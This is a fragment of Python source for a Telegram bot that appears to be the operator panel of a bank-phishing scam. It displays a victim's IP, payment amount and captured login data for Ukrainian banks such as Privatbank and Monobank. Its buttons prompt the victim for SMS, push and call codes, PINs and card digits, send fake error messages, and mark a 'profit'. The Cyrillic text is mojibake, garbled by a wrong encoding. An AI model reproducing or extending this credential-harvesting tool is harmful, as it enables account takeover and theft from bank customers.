  bot.send_message(user_id, '–°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤\n  IP:PORT | M_ID', reply_markup=markup_inline)




def vbiv_info(message, mid, cc=None, edit=False):
  global info_type_names

  user_id = message.chat.id
  # if not is_user_vbiver(user_id):
  #   bot.send_message(user_id, "üò† –í—ã –Ω–µ –≤–±–∏–≤–µ—Ä!", reply_markup=markup_ok)
  #   return
  worker = db_get_user_info(message.chat)
  if cc is None:
    cc = mamontinfo(mid, True)
    if cc is None:
      print('vbiv info not found')
      return
  if cc.state == 'disconnect':
    vbiv_cancel(message, mid, True)
    return
  l = linkinfo(None, cc.oid, True)


  # bank_names = {
  #   "Raiffeisen": "–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω-–ë–∞–Ω–∫–∞",
  #   "Privat24": "–ü—Ä–∏–≤–∞—Ç-–ë–∞–Ω–∫–∞",
  #   "Oshadbank": "–û—â–∞–¥-–ë–∞–Ω–∫–∞",
  #   "Monobank": "–ú–æ–Ω–æ-–ë–∞–Ω–∫–∞"
  # }

  # bank_name = bank_names.get(bank, SERVICE_NAMES[l.service])

  #  üÜî –°—Å—ã–ª–∫–∏: *{cc.oid if l else '–ù–µ –Ω–∞–∑–Ω–∞—á–µ–Ω'}*
  # üîó –°–µ—Ä–≤–∏—Å: *{SERVICE_NAMES[l.service] if l else '–ù–µ –∏–∑–≤–µ—Å—Ç–µ–Ω'}*
  # üÜî –ú–∞–º–æ–Ω—Ç–∞: _{mid}_
 
  t_ = f'''*üéâ –ù–æ–≤—ã–π –∫–∞–±–∏–Ω–µ—Ç {SERVICE_NAMES[l.service]}*

üì° IP –º–∞–º–æ–Ω—Ç–∞: {cc.ip if cc.ip is not None else '–ù–µ –∏–∑–≤–µ—Å—Ç–µ–Ω'}
üíµ –°—É–º–º–∞: {l.json['price'] if l else '–ù–µ –∏–∑–≤–µ—Å—Ç–Ω–∞'}

üì≤ –î–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞:'''
  if cc.number is None:
    t_ += '\n  _–ï—â—ë –Ω–µ –≤–≤–µ–¥–µ–Ω—ã_'
  else:
    for attr in cc_attributes.keys():
      value = getattr(cc, attr, None)
      if value is not None:
        # –£–¥–∞–ª—è–µ–º –≤—Å–µ –ø—Ä–æ–±–µ–ª—ã –∏–∑ —Å—Ç—Ä–æ–∫–∏
        value = value.replace(" ", "")
        attr_name = cc_attributes[attr]

        t_ += '\n  ' + f'   *{attr_name}:* `{value}`'


  # –ü–æ–ª—É—á–∏—Ç–µ –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –∏–∑ –≥–ª–æ–±–∞–ª—å–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π
  updated_info = info_storage.get(mid)

  # –ï—Å–ª–∏ –µ—Å—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
  if updated_info is not None and len(updated_info) > 0:
    
    last_source = None
    for item in updated_info:
      for key, value in item.items():
        # –ï—Å–ª–∏ –∫–ª—é—á –Ω–µ —Ä–∞–≤–µ–Ω 'mid' –∏ 'source', –¥–æ–±–∞–≤—å—Ç–µ –¥–∞–Ω–Ω—ã–µ –≤ t_
        if key not in ['mid', 'source']:
          # –ü–æ–ª—É—á–∏—Ç–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–µ–µ –∏–º—è –∫–ª—é—á–∞
          key_name = info_type_names.get(key, key)
          
          # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∏–∑–º–µ–Ω–∏–ª—Å—è –ª–∏ –∏—Å—Ç–æ—á–Ω–∏–∫
          if last_source != item.get("source"):

            # –ò–∑–º–µ–Ω–∏—Ç–µ –ø–æ—Å–ª–µ–¥–Ω–∏–π –∏—Å—Ç–æ—á–Ω–∏–∫ –Ω–∞ —Ç–µ–∫—É—â–∏–π
            last_source = item.get("source")
            
            # –î–æ–±–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤ t_
            if last_source == "ajax_send_again_form":

              t_ += '\n\n‚õîÔ∏è –ú–∞–º–æ–Ω—Ç –ø–æ–≤—Ç–æ—Ä–Ω–æ —É–∫–∞–∑–∞–ª –¥–∞–Ω–Ω—ã–µ –æ—Ç –õ–ö:'

            else:

              t_ += '\n\n‚úÖ –ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ:'
          
          # –û–±–Ω–æ–≤–∏—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è —Å –Ω–æ–≤–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π
          t_ += '\n  ' + f'   *{key_name}:* `{value}` ‚ùóÔ∏è'


  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
  markup_inline = types.InlineKeyboardMarkup()

  # –û–±—Ä–∞–±–æ—Ç–∫–∞ —É—Å–ª–æ–≤–∏–π –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –±–∞–Ω–∫–∞
  if l.service == 'privatbank':
    markup_inline.row(


      types.InlineKeyboardButton(text='üì© –ó–∞–ø—Ä–æ—Å–∏—Ç—å –∫–æ–¥ –∏–∑ –°–ú–°', callback_data=f'vbiv_sendsms_{mid}')

    )
    markup_inline.row(

      types.InlineKeyboardButton(text='üìû –ó–≤–æ–Ω–æ–∫', callback_data=f'vbiv_sendcall_{mid}'),
      
      types.InlineKeyboardButton(text='‚ùóÔ∏è –ü—É—à', callback_data=f'vbiv_sendpush_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è –ù–æ–º–µ—Ä', callback_data=f'vbiv_senderrorphone_{mid}'),
     
    )
    markup_inline.row(

      types.InlineKeyboardButton(text='‚ùóÔ∏è –ü–∞—Ä–æ–ª—å', callback_data=f'vbiv_senderrorpass_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è PIN', callback_data=f'vbiv_senderrorpin_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è –ö–æ–¥', callback_data=f'vbiv_senderrorsms_{mid}')
    )

  if l.service == 'monobank':
    markup_inline.row(
      types.InlineKeyboardButton(text='üì© –ö–æ–¥ –∏–∑ –°–ú–°', callback_data=f'vbiv_sendsms_{mid}'),

      types.InlineKeyboardButton(text='üìû –ó–≤–æ–Ω–æ–∫', callback_data=f'vbiv_sendcall_{mid}')

    )
    markup_inline.row(
      types.InlineKeyboardButton(text='üì≤ PUSH', callback_data=f'vbiv_sendpush_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è –õ–æ–≥–∏–Ω/–ø–∞—Å—Å', callback_data=f'vbiv_senderrorlogin_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='‚ùóÔ∏è –õ–æ–≥–∏–Ω', callback_data=f'vbiv_senderrorlogin_{mid}'),
      types.InlineKeyboardButton(text='‚ùóÔ∏è –¢–µ–ª–µ—Ñ–æ–Ω', callback_data=f'vbiv_senderrorphone_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='‚ùóÔ∏è –ü–∞—Ä–æ–ª—å', callback_data=f'vbiv_senderrorpass_{mid}'),

      types.InlineKeyboardButton(text='‚ùï PIN-–∫–æ–¥', callback_data=f'vbiv_sendpin_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='‚ùóÔ∏è PIN-–∫–æ–¥', callback_data=f'vbiv_senderrorpin_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è –ö–æ–¥ –∏–∑ –°–ú–°', callback_data=f'vbiv_senderrorsms_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='‚ùï 4 —Ü–∏—Ñ—Ä—ã', callback_data=f'vbiv_sendnumcard_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è 4 —Ü–∏—Ñ—Ä—ã', callback_data=f'vbiv_senderrornumcard_{mid}')
    )
    markup_inline.row(
      types.InlineKeyboardButton(text='‚ùóÔ∏è –ö–æ–¥ –∏–∑ –∑–≤–æ–Ω–∫–∞', callback_data=f'vbiv_senderrorcall_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è PUSH –∫–æ–¥', callback_data=f'vbiv_senderrorpush_{mid}')
    )

  if l.service == 'raiffeisen':
    markup_inline.row(

      types.InlineKeyboardButton(text='üì© –ö–æ–¥', callback_data=f'vbiv_sendsms_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è –õ–æ–≥–∏–Ω', callback_data=f'vbiv_senderrorlogin_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è –ü–∞—Ä–æ–ª—å', callback_data=f'vbiv_senderrorpass_{mid}')
    )
    # markup_inline.row(  
    # )

  if l.service == 'oshadbank':
    markup_inline.row(

      types.InlineKeyboardButton(text='üìû –ö–æ–¥ –∏–∑ –∑–≤–æ–Ω–∫–∞', callback_data=f'vbiv_sendcall_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è –¢–µ–ª–µ—Ñ–æ–Ω', callback_data=f'vbiv_senderrorphone_{mid}'),

    )
    markup_inline.row(

      types.InlineKeyboardButton(text='‚ùóÔ∏è PIN', callback_data=f'vbiv_senderrorpin_{mid}'),

      types.InlineKeyboardButton(text='‚ùóÔ∏è 4 —Ü–∏—Ñ—Ä—ã', callback_data=f'vbiv_senderrornumcard_{mid}'),
      
      types.InlineKeyboardButton(text='‚ùóÔ∏è –ö–æ–¥', callback_data=f'vbiv_senderrorcall_{mid}')
      
    )

  # –û–±—â–∏–µ –∫–Ω–æ–ø–∫–∏ –¥–ª—è –≤—Å–µ—Ö –±–∞–Ω–∫–æ–≤
  markup_inline.row(
    types.InlineKeyboardButton(text='‚ùì –û—à–∏–±–∫–∞', callback_data=f'vbiv_senderror_{mid}'),
    types.InlineKeyboardButton(text='‚ùå –û—Ç–º–µ–Ω–∞', callback_data=f'vbiv_cancel_{mid}'),
    types.InlineKeyboardButton(text='‚úÖ –ü—Ä–æ—Ñ–∏—Ç', callback_data=f'vbiv_end_{mid}')
  )
  markup_inline.row(
    types.InlineKeyboardButton(text='ü¶£ –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data=f'vbiv_block_{mid}')
  )

  if edit:
    if t_.replace('_', '').replace('*', '').replace('`', '') != message.text.replace('_', '').replace('*', '').replace('`', ''):

      try:
        message = bot.edit_message_text(chat_id=user_id, message_id=message.message_id, text=t_, reply_markup=markup_inline, parse_mode='Markdown')

        cc.message_id = message.message_id

        global last_update

        if last_update == "ajax_send_again_form":
          
          msg_dop = bot.send_message(chat_id=user_id, text="üëÜ –ú–∞–º–æ–Ω—Ç –æ–±–Ω–æ–≤–∏–ª –¥–∞–Ω–Ω—ã–µ –æ—Ç –õ–ö", reply_to_message_id=cc.message_id)
        
          last_update = None

        if last_update == "ajax_send_info":
          
          msg_dop = bot.send_message(chat_id=user_id, text="üëÜ –ú–∞–º–æ–Ω—Ç –¥–æ–ø–æ–ª–Ω–∏–ª –Ω–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ", reply_to_message_id=cc.message_id)
        
        last_update = None


      except Exception as e:  # e.g. - Can't edit, same message text
        print(e)
        if e.description in ['Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message', 'Bad Request: message to edit not found']:
          vbiv_cancel(message, mid, True)
          return
        # print(t_.replace('_', '').replace('*', '').replace('`', ''))
        # print(message.text)
  else:
    message = bot.send_message(user_id, t_, reply_markup=markup_inline, parse_mode='Markdown')

  sleep(2)

  vbiv_info(message, mid, cc, True)
